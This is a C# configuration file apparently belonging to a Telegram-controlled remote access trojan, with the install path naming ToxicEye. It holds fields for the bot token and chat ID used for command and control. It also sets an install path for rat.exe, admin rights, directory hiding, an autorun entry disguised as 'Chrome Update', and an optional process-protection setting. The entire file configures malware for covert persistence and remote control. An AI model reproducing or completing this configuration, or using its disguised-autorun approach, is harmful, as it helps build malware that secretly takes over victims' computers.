namespace TelegramRAT
{
    internal class config
    {
        // Telegram:
        public const string TelegramToken = "";
        public const string TelegramChatID = "";
        public static int TelegramCommandCheckDelay = 1;
        // Install:
        public static bool AdminRightsRequired = true;
        public static bool HideDirectoryEnabled = true;
        public static string InstallPath = @"C:\Users\ToxicEye\rat.exe";
        // Autorun:
        public static bool AutorunEnabled = true;
        public static string AutorunName = "Chrome Update";
        // Process BSoD protection (Have bugs):
        public static bool ProcessProtectionEnabled = false;
    }
}
